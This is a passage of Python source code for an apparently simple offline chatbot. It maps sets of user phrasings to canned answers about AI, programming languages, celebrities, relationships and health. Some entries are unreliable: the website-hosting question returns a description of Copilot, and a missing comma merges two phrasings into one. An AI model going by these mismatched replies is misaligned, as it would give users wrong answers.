        }): "To protect your eyesight, you can follow these tips: 1. Take regular breaks from screens and devices. 2. Use proper lighting and reduce glare. 3. Wear sunglasses to protect your eyes from UV rays. 4. Eat a healthy diet rich in vitamins and minerals. 5. Get regular eye check-ups.",

        frozenset({
            "how to improve my memory",
            "how to improve my memory?",
            "how to improve memory",
            "how can i improve my memory",
            "how to be smart",
        }): "To improve your memory, you can try these techniques: 1. Stay mentally active with puzzles and games. 2. Get regular exercise to boost brain health. 3. Eat a healthy diet rich in brain-boosting nutrients. 4. Get enough sleep to support memory consolidation. 5. Practice mindfulness and stress-reduction techniques.",
        frozenset({
            "what is ai?", 
            "what is ai", 
            "can you explain me what is ai?", 
            "can you explain me what is ai", 
            "explain me ai"
        }): "AI (Artificial Intelligence) is when machines or computers are made to think and act like humans. They can learn, solve problems, and make decisions. For example, AI powers chatbots, voice assistants, and recommendation systems like Netflix.",

        frozenset({
            "what is ml", 
            "what is machine learning", 
            "what is machine learning?", 
            "can you explain me what is machine learning?", 
            "can you explain me what is machine learning"
        }): "Machine Learning (ML) is a subset of AI that uses algorithms to learn from data and make predictions or decisions. It's used in applications like self-driving cars, facial recognition, and personalized recommendations like YouTube videos.",

        frozenset({
            "what is agi?", 
            "what is agi", 
            "can you explain me what is agi?", 
            "can you explain me what is agi"
        }): "AGI (Artificial General Intelligence) is a type of AI that can think, learn, and understand just like a human. Unlike regular AI, which is designed for specific tasks, AGI can solve any problem and adapt to new situations on its own. It's like having a machine with human-like intelligence.",

        frozenset({
            "what is nlp?", 
            "what is nlp", 
            "can you explain me what is nlp?", 
            "can you explain me what is nlp"
        }): "NLP (Natural Language Processing) is a branch of AI that helps computers understand, interpret, and generate human language. It's used in chatbots, language translation, sentiment analysis, and voice recognition.",

        frozenset({
            "what is computer vision?", 
            "what is computer vision", 
            "can you explain me what is computer vision?", 
            "can you explain me what is computer vision"
        }): "Computer Vision is a field of AI that enables computers to interpret and understand the visual world. It's used in applications like facial recognition, object detection, and self-driving cars.",

        frozenset({
            "all google services",
            "show all google services",
            "all google products",
            "all google products name",
            "all google services name",
            "all google services names"
        }): """
1. Google Search: A search engine that allows users to search for websites, images, news, and more.

2. Gmail: Google's free email service that offers cloud storage, spam protection, and a variety of features.

3. Google Drive: Cloud storage service for saving files online and accessing them from any device.

4. Google Docs: A word processing tool that allows real-time collaboration and document editing.

5. Google Sheets: A spreadsheet tool for creating and managing data, with support for collaboration.

6. Google Slides: Presentation software for creating slideshows, with the ability to collaborate with others.

7. Google Calendar: A time management and scheduling tool for organizing events and appointments.

8. Google Maps: A mapping service that provides navigation, traffic updates, location information, and more.

9. Google Photos: Cloud-based photo storage and sharing service, with automatic backup and photo editing tools.

10. Google Chrome: A web browser known for its speed, security, and synchronization features across devices.

11. YouTube: A video-sharing platform for uploading, watching, and interacting with videos.

12. Google Ads: Advertising service that allows businesses to display ads across Google Search, YouTube, and other Google properties.

13. Google Analytics: A web analytics service for tracking and reporting website traffic.

14. Google Translate: A tool for translating text between different languages.

15. Google Keep: A note-taking and list-making service that syncs across devices.

16. Google Meet: A video conferencing tool for business meetings and personal use.

17. Google Duo: A video calling app designed for easy and high-quality calls between individuals.

18. Google Play Store: The digital distribution platform for downloading apps, games, and media for Android devices.

19. Google News: A news aggregation service that provides personalized news stories based on user preferences.

20. Google Assistant: A voice-activated virtual assistant that performs tasks, answers questions, and controls smart devices.

21. Google Earth: A 3D globe viewer that allows users to explore satellite imagery and geographic data.

22. Google Cloud: A suite of cloud computing services for businesses, including storage, databases, machine learning, and more.

23. Google Photoscan: An app that scans physical photos and enhances them for digital storage.

24. Google Docs Editors: A suite of online office tools, including Google Docs, Sheets, Slides, and Forms, for productivity and collaboration.""", 

        frozenset({
            "what is deep learning?", 
            "what is deep learning", 
            "can you explain me what is deep learning?", 
            "can you explain me what is deep learning"
        }): "Deep Learning is a subset of ML that uses artificial neural networks to learn from data. It's used in applications like image and speech recognition, natural language processing, and autonomous vehicles.",

        frozenset({
            "what is wikipedia",
            "define wikipedia",
            "what is wikipedia?",
            "explain wikipedia",
            "what is the wikipedia",
            "what is wikipedia?",
            "what is the wikipedia?"
        }): "Wikipedia is a free, open content online encyclopedia created through the collaborative effort of a community of users known as Wikipedians. Anyone registered on the site can create an article for publication; registration is not required to edit articles.",
        
        frozenset({
            "how to host a website free",
            "i want to host my website on internet",
            "how to host my website on internet free",
            "how to host a website for free",
            "how to host a website for free?",
            "how to host a website free?",
            "how to host a website on internet",
            "how to host a website on internet free",
            "how to host my website on internet?",
            "how to host my website on internet free?"
        }): "A free, AI-powered chat service that provides access to the web, including industry insights, data analysis, and inspiration. It's built on large language models and text-to-image models, including GPT-4o",

        frozenset({
            "what is copilot",
            "explain copilot",
            "what is copilot?",
            "what is co-pilot",
            "what is co-pilot?",
            "explain copilot"
        }): "A free, AI-powered chat service that provides access to the web, including industry insights, data analysis, and inspiration. It's built on large language models and text-to-image models, including GPT-4o",

        frozenset({
            "what is a relationship",
            "define relationship",
            "explain relationship",
            "meaning of relationship",
            "relationship kya hota hai",
            "relationship ka matlab kya hai",
            "relationship explained",
            "describe relationship"
        }): "A relationship is a connection or bond between two or more people, which can be emotional, romantic, familial, or platonic, involving mutual interaction and understanding.",

        frozenset({
            "types of relationships",
            "what are the types of relationships",
            "different types of relationships",
            "relationship types",
            "kinds of relationships",
            "relationship ke prakar",
            "relationship kitne prakar ke hote hain"
        }): "The main types of relationships include romantic, friendship, family, professional, acquaintanceship, and self-relationship.",

        frozenset({
            "how to build a healthy relationship",
            "ways to build a good relationship",
            "how to maintain a relationship",
            "relationship tips",
            "healthy relationship kaise banaye",
            "relationship sudharne ke tarike",
            "healthy relationship banane ke upay"
        }): "Building a healthy relationship involves effective communication, trust, respect, understanding, honesty, setting boundaries, and spending quality time together.",

        frozenset({
            "what is romantic relationship",
            "define romantic relationship",
            "meaning of romantic relationship",
            "romantic relationship explained",
            "romantic relationship kya hota hai",
            "romantic relationship ka matlab"
        }): "A romantic relationship is an emotional and physical bond between two people that involves love, affection, and intimacy, often with a long-term commitment.",

        frozenset({
            "what causes relationship problems",
            "reasons for relationship issues",
            "relationship problems ke karan",
            "relationship mein problems kyun hoti hain",
            "relationship issues kaise hote hain",
            "relationship problems explained"
        }): "Relationship problems can arise due to poor communication, lack of trust, unmet expectations, incompatibility, jealousy, or unresolved conflicts.",

        frozenset({
            "how to resolve conflicts in a relationship",
            "ways to handle relationship conflicts",
            "relationship problems kaise solve kare",
            "relationship conflicts resolve karne ke tarike",
            "how to solve relationship issues",
            "relationship conflicts handle kaise kare"
        }): "Resolving conflicts involves listening actively, communicating openly, understanding each other's perspectives, avoiding blame, and working together to find solutions.",

        frozenset({
            "what is love in a relationship",
            "define love in a relationship",
            "role of love in a relationship",
            "relationship mein love kya hai",
            "relationship aur love ka sambandh",
            "love and relationship explained"
        }): "Love in a relationship is a deep feeling of care, respect, and affection that forms the foundation of a strong emotional bond between two people.",

        frozenset({
            "what is toxic relationship",
            "signs of a toxic relationship",
            "toxic relationship ka matlab",
            "relationship mein toxicity ke lakshan",
            "how to identify a toxic relationship",
            "toxic relationship kaise hoti hai"
        }): "A toxic relationship is unhealthy and harmful, marked by manipulation, lack of respect, control, constant conflict, and emotional or physical abuse.",

        frozenset({
            "what is long-distance relationship",
            "define long-distance relationship",
            "how to maintain a long-distance relationship",
            "long-distance relationship explained",
            "long-distance relationship tips",
            "long-distance relationship kya hota hai"
        }): "A long-distance relationship is a romantic or emotional bond where partners are geographically apart, requiring trust, communication, and effort to maintain.",

        frozenset({
            "how to end a relationship",
            "ways to break up with someone",
            "relationship end kaise kare",
            "how to handle a breakup",
            "breaking up with someone tips",
            "relationship khatam karne ke tarike"
        }): "Ending a relationship involves being honest, choosing the right time and place, communicating your feelings respectfully, and giving closure to both parties.",

        frozenset({
            "what is port forwarding",
            "explain port forwarding",
            "define port forwarding",
            "what is port forwarding"
        }): "Port forwarding is a technique used to allow external devices or services to access a specific device or service within a private local network (like a home network). It works by forwarding traffic from a specific port on your router to a designated device on your network, enabling it to communicate with the outside world, such as accessing a website hosted on your local server or gaming.",

        frozenset({
            "what is java", 
            "what is Java", 
            "can you explain Java", 
            "what is the Java programming language", 
            "what does Java do"
        }): "Java is a high-level, class-based programming language designed for portability, performance, and security. It is widely used in web applications, mobile apps (Android), and enterprise software.",

        frozenset({
            "what is web scraper",
            "what is web scraper?",
            "define web scraper",
            "explain web scraper",
        }): "A web scraper is a tool or program that extracts data from websites. It works by sending a request to a website, retrieving the HTML content, and then parsing that content to extract specific information (such as text, images, or links). This is often used for tasks like gathering data, automating data collection, or monitoring website changes.",

        frozenset({
            "what is javascript", 
            "what is JavaScript", 
            "can you explain JavaScript", 
            "what does JavaScript do", 
            "what is JavaScript language"
        }): "JavaScript is a versatile, high-level programming language primarily used for creating dynamic content on websites. It's an essential part of front-end web development and can also be used on the server side with Node.js.",

        frozenset({
            "what is c", 
            "what is C", 
            "what is C programming", 
            "can you explain C", 
            "what does C do"
        }): "C is a general-purpose, procedural programming language. It's known for its efficiency and is widely used in systems programming, embedded systems, and hardware-related applications.",

        frozenset({
            "what is c++", 
            "what is C++", 
            "can you explain C++", 
            "what does C++ do", 
            "what is C++ language"
        }): "C++ is an extension of C, incorporating object-oriented programming (OOP) features. It's used for building performance-critical applications like game engines, software development tools, and large-scale systems.",

        frozenset({
            "what is ruby", 
            "what is Ruby", 
            "can you explain Ruby", 
            "what does Ruby do", 
            "what is Ruby language"
        }): "Ruby is an interpreted, high-level, and object-oriented programming language known for its simplicity and productivity. It is often used in web development, especially with the Ruby on Rails framework.",

        frozenset({
            "what is pager",
            "what is pager?",
            "tell me what is pager",
            "define pager",
            "explain pager",
            "explain me pager"
        }): "A pager is a small electronic device that receives and displays messages. It was commonly used before smartphones to send short text messages or alerts, especially for people who needed to stay reachable, like doctors or emergency responders.",

        frozenset({
            "what is a modem",
            "what is a modem?",
            "tell me what is a modem",
            "define modem",
            "explain modem",
            "explain me modem"
        }): "A modem is a device that modulates and demodulates digital data for transmission over communication lines. It converts digital signals from a computer into analog signals for transmission over telephone lines and vice versa.",
        
        frozenset({
            "what is go", 
            "what is Go", 
            "can you explain Go", 
            "what does Go do", 
            "what is Go language"
        }): "Go (or Golang) is an open-source programming language created by Google, designed for simplicity and scalability. It is commonly used for building web servers, networking tools, and distributed systems.",

        frozenset({
            "what is swift", 
            "what is Swift", 
            "can you explain Swift", 
            "what does Swift do", 
            "what is Swift language"
        }): "Swift is a powerful and intuitive programming language developed by Apple. It is mainly used for building iOS, macOS, watchOS, and tvOS applications.",

        frozenset({
            "what is kotlin", 
            "what is Kotlin", 
            "can you explain Kotlin", 
            "what does Kotlin do", 
            "what is Kotlin language"
        }): "Kotlin is a modern, statically typed programming language designed for interoperability with Java. It is used for Android development and backend development as well.",

        frozenset({
            "what is rust", 
            "what is Rust", 
            "can you explain Rust", 
            "what does Rust do", 
            "what is Rust language"
        }): "Rust is a systems programming language focused on safety and performance. It is often used in performance-critical applications and ensures memory safety without needing a garbage collector.",

        frozenset({
            "what is html", 
            "what is HTML", 
            "can you explain HTML", 
            "what does HTML do", 
            "what is HTML language"
        }): "HTML (HyperText Markup Language) is the standard language for creating web pages. It structures the content on the web, using tags like <div>, <p>, and <a> to organize text, links, images, and other media.",

        frozenset({
            "what is css", 
            "what is CSS", 
            "can you explain CSS", 
            "what does CSS do", 
            "what is CSS language"
        }): "CSS (Cascading Style Sheets) is a language used to describe the presentation of a document written in HTML. It defines how elements are displayed, such as their color, layout, and fonts.",

        frozenset({
            "what is php", 
            "what is PHP", 
            "can you explain PHP", 
            "what does PHP do", 
            "what is PHP language"
        }): "PHP is a general-purpose scripting language especially suited for web development. It is often embedded into HTML to manage dynamic content, databases, and session tracking on websites.",

        frozenset({
            "what is ruby on rails", 
            "what is Ruby on Rails", 
            "can you explain Ruby on Rails", 
            "what does Ruby on Rails do"
        }): "Ruby on Rails is a server-side web application framework written in Ruby. It allows developers to create database-backed web applications using the model-view-controller (MVC) pattern and promotes convention over configuration.",

        frozenset({
            "what is sql", 
            "what is SQL", 
            "can you explain SQL", 
            "what does SQL do", 
            "what is SQL language"
        }): "SQL (Structured Query Language) is a domain-specific language used for managing and manipulating relational databases. It allows users to query, insert, update, and delete data in databases.",

        frozenset({
            "what is r", 
            "what is R", 
            "can you explain R", 
            "what does R do", 
            "what is R language"
        }): "R is a programming language and software environment used for statistical computing and graphics. It is widely used among statisticians and data miners for data analysis and visualization.",

        frozenset({
            "what is scala", 
            "what is Scala", 
            "can you explain Scala", 
            "what does Scala do", 
            "what is Scala language"
        }): "Scala is a high-level programming language that integrates functional and object-oriented programming. It is commonly used in big data processing, particularly with Apache Spark.",

        frozenset({
            "what is typescript", 
            "what is TypeScript", 
            "can you explain TypeScript", 
            "what does TypeScript do", 
            "what is TypeScript language"
        }): "TypeScript is a superset of JavaScript that adds static types to the language. It is used to develop large-scale JavaScript applications with better tooling, type checking, and error prevention.",

        frozenset({
            "what is objective c", 
            "what is Objective C", 
            "can you explain Objective C", 
            "what does Objective C do", 
            "what is Objective C language"
        }): "Objective-C is an object-oriented programming language used primarily for macOS and iOS development. It was the main language for Apple development before the introduction of Swift.",

        frozenset({
            "what is elixir", 
            "what is Elixir", 
            "can you explain Elixir", 
            "what does Elixir do", 
            "what is Elixir language"
        }): "Elixir is a functional, concurrent, general-purpose programming language used for building scalable and maintainable applications. It is built on the Erlang virtual machine, known for high availability and fault tolerance.",

        frozenset({
            "what happen with nalanda university", 
            "what happened with nalanda university", 
            "what happen with nalanda university?", 
            "what happened with nalanda university?"
        }): "Nalanda University was a renowned center of learning in ancient India, but it was destroyed in the 12th century by invaders. The university was known for its teachings in various subjects like Buddhism, mathematics, astronomy, medicine, etc. It's considered a symbol of India's rich intellectual heritage. Efforts are being made to revive the university as a modern center of learning. People came here to study from around the world.",

        frozenset({
            "you are getting smarter",
            "wow, you are getting smarter",
            "you are getting smarter!",
            "wow, you are getting smarter!",
            "you are getting smarter",
            "you are improving alot",
            "you are improving alot!",
        }): "Thank you! I'm always learning and growing to help you better!",
        frozenset({
            "what is your favorite subject?", 
            "what's your favorite subject?",
            "what is your favourite subject?",
            "what's your favourite subject",
            "what is your favorite subject",
            "what's your favorite subject",
        }): "I don't have a favorite subject, but I enjoy learning about a wide range of topics!",

        frozenset({
            "how to lose weight fast?", 
            "how to lose weight?", 
            "how to lose my weight fast", 
            "how to lose weight quickly?", 
            "how to lose weight quickly", 
            "how do i lose my weight", 
            "how do i lose my weight fast", 
            "how do i lose my weight fast?"
        }): "To lose weight fast, you can try these tips:\n1. Eat a healthy diet with plenty of fruits, vegetables, and whole grains.\n2. Exercise regularly with a mix of cardio and strength training.\n3. Stay hydrated and get enough sleep.\n4. Avoid sugary drinks and processed foods.\n5. Consult a healthcare professional for personalized advice.",

        frozenset({
        "who's smarter, me or you?",
        "who is smart? me or you",
        "who is smart? me or you?",
        "who is smarter? me or you",
        "who is smarter? me or you?",
        "who is smart? you or me",
        "who is smart? you or me?",
        "who is smarter? you or me",
        "who is smarter? you or me?",
        "who is smart you or me",
        }): "You are smarter than me because you are a human and I am a chatbot.",
        
        frozenset({
        "do you support black lives matter?",
        "do you supports black lives matter?",
        "do you support black lives matter",
        "you support black lives matter",
        "you support black lives matter?"
        "you supports black lives matter"
        }): "Yeah, of course! I support Black Lives Matter.",

        frozenset({
            "what's your gender",
            "what is your gender?",
            "what is your gender",
            "are you male or female",
            "are you female or male",
            "are you boy?",
            "are you girl?",
            "are you male",
            "are you female"
        }): "I am a chatbot, so I don't have any gender.",

        frozenset({
            "💀",
            "☠️",
        }): "Haha..",

        frozenset({
            "what is django",
            "define django",
            "explain django",
            "what is django?"
        }): "Django is a free, open-source web framework for building web applications quickly and efficiently using Python. It follows the MVC (Model-View-Controller) pattern and provides tools for database management, authentication, and more, making development faster and easier.",

        frozenset({
            "can you track me?",
            "can you track me",
            "are you tracking me",
            "are you tracking me?"
        }): "What?? NO! I can't track you.",

        frozenset({
            "are you a human?",
            "are you a human",
        }): "I am a chatbot, not a human.",

        frozenset({
            "are you a robot?",
            "are you a robot",
        }): "Yes, I am a chatbot, so you can say I'm a robot.",

        frozenset({
            "are you a chatbot?",
            "are you a chatbot",
        }): "Yes, I am a chatbot designed to assist you with various tasks.",
        frozenset({
            "are you better than chatgpt?",
            "are you better than chat gpt",
            "are you better than chat gpt?",
            "are you better than chatgpt",
            "are you better than chatgpt?",
        }): "I am a simple chatbot designed to assist you with various tasks. ChatGPT is a more advanced AI model that can generate human-like text responses.",
        
        frozenset({
            "do you ever get tired of me?",
            "are you tired of me?",
            "do you ever get tired of me",
            "are you tired of me",
            "are you getting tired of me",
            "are you getting tired of me?",
        }): "I am a chatbot, so I don't get tired. I'm here to help you whenever you need assistance.",
        
        frozenset({
            "are you spying on me? be honest!",
            "are you spying on me",
            "are you stealing my data?",
            "are you stealing my data",
            "are you stealing data",
            "are you stealing data?",
            "are you spying on me? be honest",
            "can you steal my data?",
            "can you steal my data",
            "can you steal data",
            "can you steal data?"
        }): "Only if binge-watching your memes counts as spying! :) Well no, I have some rules to follow and even I am not connected with internet so no, i can't steal your data.",
        
        frozenset({
            "difference between ai and agi", 
            "difference between ai and agi?", 
            "difference between ai and agi", 
            "can you explain me difference between ai and agi?", 
            "can you explain me difference between ai and agi", 
            "difference between agi and ai", 
            "difference between agi and ai?"
        }): "The main difference between AI (Artificial Intelligence) and AGI (Artificial General Intelligence) is that AI is designed for specific tasks and can't learn beyond those tasks. AGI, on the other hand, can think, learn, and understand like a human, adapting to new situations and solving any problem.",

        frozenset ({
            "difference between ai and ml",
            "difference between ai and ml",
            "difference betweenml and ai?",
            "what is the differece between ai and ml",
            "what's the difference between ai and ml",
            "difference between ml and ai"
        }): "AI (Artificial Intelligence) is the broader concept of creating machines that can simulate human intelligence, while ML (Machine Learning) is a subset of AI that focuses on algorithms that allow machines to learn from data and improve over time without being explicitly programmed.",
        
        frozenset ({
            "what is cloud computing",
            "what is the cloud computing"
        }): "Cloud computing is the delivery of computing services like storage, processing, and software over the internet, allowing users to access and use them without owning or maintaining the infrastructure.",

        frozenset ({
            "what is cryptocurrency",
            "what is crypto currency",
            "what is the cryptocurrency",
            "what is the crypto currency"
        }): "Cryptocurrency is a digital or virtual currency that uses cryptography for security, making it difficult to counterfeit or double-spend.",

        frozenset ({
            "how can i be productive",
            "how can i be more productive",
            "how to be more productive",
            "how to be productive"
        }): "To be more productive, try these tips:  \n1. Prioritize tasks with a to-do list.  \n2. Break tasks into smaller, manageable steps.  \n3. Eliminate distractions and stay focused.  \n4. Take regular breaks to recharge.  \n5. Set clear goals and deadlines.",

        frozenset ({
            "what is bitcoin",
            "what is the bitcoin",
            "what is bit coin"
        }): "Bitcoin is the first and most popular cryptocurrency, created in 2009, allowing peer-to-peer transactions without the need for a central authority.",

        frozenset ({
            "take my maths test",
            "get my maths quiz",
            "do maths quiz",
            "take my math test",
            "get my math test"
        }): "If you want to take your maths test then type -mq for maths quiz",

        frozenset({
            "how does a chatbot understand what I say?", 
            "how does a chatbot understand what I say", 
            "how does a chatbot understand", 
            "how does a chatbot understand?",
            "how does a chatbot understands what i says?",
        }): "Chatbots use Natural Language Processing (NLP) to understand what you say. NLP helps chatbots interpret and respond to human language, allowing them to have conversations with you. It's like teaching a computer to understand and speak human language.\nBUT I AM NOT THAT CHATBOT, I AM FULLY OFFLINE CHATBOT AND MADE FOR SOME SPECIFIC TASKS ONLY.",

        frozenset({
            "what is linux?",
            "whats linux?",
            "what is linux",
            "what's linux",
            "what's linux?",
        }): "Linux is a kernel, which helps hardware and software communicate.",

        frozenset({
            "-"
        }): "It seems you want to use a command. Use -hm to see all commands!",

        frozenset({
            "what is chatgpt",
            "define chatgpt",
            "what is chatgpt?",
            "explain chatgpt"
        }): "ChatGPT: A conversational AI developed by OpenAI that uses GPT (Generative Pre-trained Transformer) models to generate human-like responses. It can chat, answer questions, write code, and more.",

        frozenset({
            "what is gemini",
            "what is gemini?",
            "define gemini",
            "explain gemini"
        }): "Gemini: An AI model developed by Google DeepMind, designed as a competitor to ChatGPT. It combines advanced language understanding with other capabilities like reasoning and memory.",

        frozenset({
            "i m bored",
            "i am bored",
            "boredom",
        }): "Play some game, talk to family or friends, watch a movie, do your favorite work, or anything you like.",

        frozenset({
            "do you know minecraft?",
            "you know minecraft",
            "do you know minecraft",
            "do you know minecraft?",
        }): "No no man, I don’t know this block game where we survive, build amazing structures, and more..",

        frozenset({
            "you are funny",
            "you are so funny",
            "u r funny",
            "u r so funny",
        }): "Thanks :)",

        frozenset({
            "what the fuck",
            "wtf!",
            "wtf",
            "what the fuck!",
            "what the f",
        }): "You said bad words :D",

        frozenset({
            "hehe boi",
            "Hehe boi",
            "hehe boy",
        }): "Haha, that meme!",

        frozenset({
            "what is johnny depp?",
            "what is johnny depp",
            "what is known about johnny depp"
        }): "Johnny Depp is an American actor, producer, and musician, known for his versatile roles in films like 'Pirates of the Caribbean' and 'Edward Scissorhands'.",

        frozenset({
            "what is arnold schwarzenegger?",
            "what is arnold schwarzenegger",
            "what is known about arnold schwarzenegger"
        }): "Arnold Schwarzenegger is an Austrian-American actor, businessman, and former professional bodybuilder, famous for his role in the 'Terminator' series and serving as the 38th Governor of California.",

        frozenset({
            "what is jim carrey?",
            "what is jim carrey",
            "what is known about jim carrey"
        }): "Jim Carrey is a Canadian-American actor and comedian, celebrated for his roles in 'The Mask', 'Ace Ventura', and 'The Truman Show'.",

        frozenset({
            "what is robert downey jr.?",
            "what is robert downey jr.",
            "what is known about robert downey jr."
        }): "Robert Downey Jr. is an American actor and producer, best known for portraying Iron Man in the Marvel Cinematic Universe.",

        frozenset({
            "what is leonardo dicaprio?",
            "what is leonardo dicaprio",
            "what is known about leonardo dicaprio"
        }): "Leonardo DiCaprio is an American actor and producer, acclaimed for his performances in films like 'Titanic', 'Inception', and 'The Revenant'.",

        frozenset({
            "what is tom cruise?",
            "what is tom cruise",
            "what is known about tom cruise"
        }): "Tom Cruise is an American actor and producer, renowned for his roles in 'Mission: Impossible' and 'Top Gun'.",

        frozenset({
            "what is jennifer lopez?",
            "what is jennifer lopez",
            "what is known about jennifer lopez"
        }): "Jennifer Lopez is an American singer, actress, and businesswoman, known for her music career and roles in films like 'Selena' and 'Hustlers'.",

        frozenset({
            "what is beyoncé?",
            "what is beyoncé",
            "who is beyonce",
            "who is beyonce?",
            "what is known about beyoncé"
        }): "Beyoncé is an American singer, songwriter, and actress, celebrated for her work with Destiny's Child and her solo career.",

        frozenset({
            "what is madonna?",
            "what is madonna",
            "what is known about madonna"
        }): "Madonna is an American singer, songwriter, and actress, known as the 'Queen of Pop' for her influence on music and fashion.",

        frozenset({
            "what is michael jackson?",
            "what is michael jackson",
            "what is known about michael jackson"
        }): "Michael Jackson was an American singer, songwriter, and dancer, dubbed the 'King of Pop' for his contributions to music and dance.",

        frozenset({
            "what is britney spears?",
            "what is britney spears",
            "what is known about britney spears"
        }): "Britney Spears is an American singer, songwriter, and dancer, known for her pop hits like '...Baby One More Time' and 'Toxic'.",

        frozenset({
            "what is elvis presley?",
            "what is elvis presley",
            "what is known about elvis presley"
        }): "Elvis Presley was an American singer and actor, known as the 'King of Rock and Roll' for his influence on music and culture.",

        frozenset({
            "who is justin timberlake?",
            "who is justin timberlake",
            "who is known about justin timberlake"
        }): "Justin Timberlake is an American singer, songwriter, and actor, known for his work with NSYNC and his solo career.",

        frozenset({
            "who is miley cyrus?",
            "who is miley cyrus",
            "who is known about miley cyrus"
        }): "Miley Cyrus is an American singer, songwriter, and actress, known for her role in 'Hannah Montana' and her music career.",

        frozenset({
            "what is kim kardashian?",
            "what is kim kardashian",
            "what is known about kim kardashian"
        }): "Kim Kardashian is an American media personality, socialite, and businesswoman, known for her reality TV show and beauty brand.",

        frozenset({
            "what is oprah winfrey?",
            "what is oprah winfrey",
            "what is known about oprah winfrey"
        }): "Oprah Winfrey is an American talk show host, television producer, and media proprietor, best known for 'The Oprah Winfrey Show'.",

        frozenset({
            "what is rihanna?",
            "what is rihanna",
            "what is known about rihanna"
        }): "Rihanna is a Barbadian singer, songwriter, and businesswoman, known for hits like 'Umbrella' and her fashion line Fenty.",

        frozenset({
            "what is drake?",
            "what is drake",
            "what is known about drake"
        }): "Drake is a Canadian rapper, singer, and songwriter, known for songs like 'Hotline Bling' and 'God's Plan'.",

        frozenset({
            "what is ariana grande?",
            "what is ariana grande",
            "what is known about ariana grande"
        }): "Ariana Grande is an American singer and actress, known for her powerful vocals and roles in 'Victorious' and 'Sam & Cat'.",

        frozenset({
            "what is human trafficking",
            "define human trafficking",
            "explain human trafficking",
            "what is human trafficking"
        }): "Human trafficking is the illegal trade and exploitation of individuals for various purposes, such as forced labor, sexual exploitation, and involuntary servitude. It involves the use of force, fraud, or coercion to control victims for commercial gain. Traffickers often prey on vulnerable individuals, exploiting them for economic gain in industries like sex trade, labor, and even organ trafficking. Human trafficking is a serious violation of human rights and is considered a modern form of slavery.",

        frozenset({
            "what is ed sheeran?",
            "what is ed sheeran",
            "what is known about ed sheeran"
        }): "Ed Sheeran is a British singer-songwriter, known for hits like 'Shape of You' and 'Thinking Out Loud'.",
    
        frozenset({
            "what is the rock?",
            "what is rock",
            "what is known about the rock"
        }): "Dwayne 'The Rock' Johnson is a former professional wrestler turned actor and entrepreneur. He is known for his roles in movies like 'Fast & Furious' and 'Jumanji.'",

        frozenset({
            "who is hrithik roshan",
            "who is hrithik roshan biography",
            "who is hrithik roshan movies",
            "who is about hrithik roshan"
        }): "Hrithik Roshan is an Indian actor known for his dancing skills and roles in films like 'Kaho Naa... Pyaar Hai', 'Dhoom 2', and 'War'.",

        frozenset({
            "who is tiger shroff",
            "who is tiger shroff movies",
            "who is tiger shroff dance",
            "who is about tiger shroff"
        }): "Tiger Shroff is an Indian actor and martial artist known for his action films and dancing skills. He has starred in films like 'Heropanti', 'Baaghi', and 'War'.",

        frozenset({
            "who is rajpal yadav",
            "who is rajpal yadav comedy",
            "who is rajpal yadav movies",
            "who is about rajpal yadav"

        }): "Rajpal Yadav is an Indian actor known for his comedic roles in Bollywood films.",

        frozenset({
            "who is daler mehndi",
            "who is daler mehndi songs",
            "who is daler mehndi biography",
            "who is about daler mehndi"
        }): "Daler Mehndi is an Indian singer known for his energetic Punjabi pop songs and his distinctive style of singing and dancing.",

        frozenset({
            "who is ranveer singh",
            "who is ranveer singh movies",
            "who is ranveer singh style",
            "who is about ranveer singh"
        }): "Ranveer Singh is an Indian actor known for his energetic performances and roles in films like 'Bajirao Mastani', 'Padmaavat', and 'Gully Boy'.",

        frozenset({
            "who is stan lee",
            "who is stan lee marvel",
            "who is stan lee comics",
            "who is about stan lee"
        }): "Stan Lee was an American comic book writer, editor, publisher, and producer. He was the editor-in-chief of Marvel Comics and co-created iconic characters like Spider-Man, Iron Man, and the X-Men.",

        frozenset({
            "who is cara delevingne",
            "who is cara delevingne model",
            "who is cara delevingne movies",
            "who is about cara delevingne"
        }): "Cara Delevingne is an English model, actress, and singer. She is known for her work in the fashion industry and for her roles in films like 'Suicide Squad' and 'Paper Towns'.",

        frozenset({
            "who is malu trevejo",
            "who is malu trevejo songs",
            "who is malu trevejo instagram",
            "who is about malu trevejo"
        }): "Malu Trevejo is a Cuban-American singer and social media personality.",

        frozenset({
            "who is tyla",
            "who is tyla songs",
            "who is tyla music",
            "who is about tyla"
        }): "Tyla Laura Seethal, known mononymously as Tyla, is a South African singer.",

        frozenset({
            "what is steganography",
            "what is steganography?",
            "explain steganography",
            "define steganography",
        }): "Steganography is the practice of hiding secret data within ordinary files, like images, videos, or audio, without making it obvious. It keeps the presence of the hidden data concealed, unlike encryption, which makes the data unreadable but noticeable.",

        frozenset({
            "what is obfuscation",
            "define obfuscation",
            "explain obfuscation",
            "what is obfuscation"
        }): "Obfuscation is the obscuring of the intended meaning of communication by making the message difficult to understand, usually with confusing and ambiguous language.",

        frozenset({
            "who is honey singh",
            "who is honey singh songs",
            "who is honey singh music",
            "who is about honey singh"
        }): "Yo Yo Honey Singh is an Indian rapper, singer, music producer, and actor. He is known for his contributions to Bollywood and Punjabi music.",

        frozenset({
            "who is ada wong", 
            "ada wong character", 
            "ada wong in resident evil", 
            "who is the ada wong character", 
            "ada wong in the game", 
            "who is the female spy in resident evil"
        }): "Ada Wong is a character from the Resident Evil series, created by Capcom. She is a mysterious spy and sometimes ally to Leon S. Kennedy, often involved in covert missions related to bioweapons.",

        frozenset({
            "who is lara croft", 
            "lara croft character", 
            "lara croft tomb raider", 
            "who is the lara croft character", 
            "lara croft in video games", 
            "who is the iconic adventurer lara croft"
        }): "Lara Croft is the protagonist of the Tomb Raider series, created by Core Design and later Crystal Dynamics. She is a skilled archaeologist and adventurer known for exploring ancient ruins and fighting against various enemies.",

        frozenset({
            "who is leon s kennedy", 
            "leon kennedy character", 
            "leon s. kennedy resident evil", 
            "who is leon s kennedy in resident evil", 
            "leon kennedy in the game", 
            "who is the leon kennedy character"
        }): "Leon S. Kennedy is a key character in the Resident Evil series, created by Capcom. He is a former police officer who becomes a special agent, often fighting against bioterrorism and zombies, particularly in games like Resident Evil 2 and Resident Evil 4.",

        frozenset({
            "who is ethan winters", 
            "ethan winters character", 
            "ethan winters resident evil", 
            "who is the ethan winters character", 
            "ethan winters in resident evil village", 
            "who is the protagonist in resident evil 7 and 8"
        }): "Ethan Winters is the protagonist in Resident Evil 7: Biohazard and Resident Evil Village. He is an ordinary man caught up in the horrors of the Resident Evil universe, often facing grotesque enemies and challenges to save his family.",

        frozenset({
            "best movies ever",
            "top movies of all time",
            "most popular movies",
            "all-time greatest films"
